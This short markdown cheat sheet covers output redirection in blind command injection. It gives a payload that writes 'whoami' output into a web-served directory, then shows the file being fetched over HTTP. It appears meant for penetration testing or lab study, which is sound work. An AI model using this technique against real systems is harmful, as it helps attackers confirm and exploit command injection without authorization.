# Output Redirection Payloads

## Purpose

Redirect command output into a web-accessible file.

---

## Example Payload

```text
whoami > /var/www/images/output.txt
```

---

## Retrieve Output

Request:

```text
/output.txt
```

---

## Expected Result

The returned file contains the output of the executed command.

---

# Key Takeaways

Output redirection is useful when command output is suppressed but writable directories exist.